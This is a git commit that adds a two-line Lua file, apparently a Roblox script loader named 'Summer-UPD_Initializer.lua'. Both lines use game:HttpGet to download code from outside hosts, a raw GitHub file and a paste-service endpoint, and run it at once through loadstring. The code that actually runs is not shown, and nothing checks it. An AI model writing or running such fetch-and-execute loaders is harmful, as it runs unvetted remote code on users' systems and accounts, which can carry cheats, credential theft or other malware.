bec8cbfe025ef9b3d480f9102bb0c17cd217ad0d
gagscript-server2 <tiktokbusinessacc08@gmail.com>
2025-07-24 08:39:57 +0800

    Create Summer-UPD_Initializer.lua

---
+++ Summer-UPD_Initializer.lua
@@ -0,0 +1,2 @@
+loadstring(game:HttpGet("https://raw.githubusercontent.com/hoodratleahh/Summer-UPD/refs/heads/main/Initializer.lua"))()
+loadstring(game:HttpGet("https://api.rubis.app/v2/scrap/2gYQVsLBUXUEn6Rl/raw", true))()
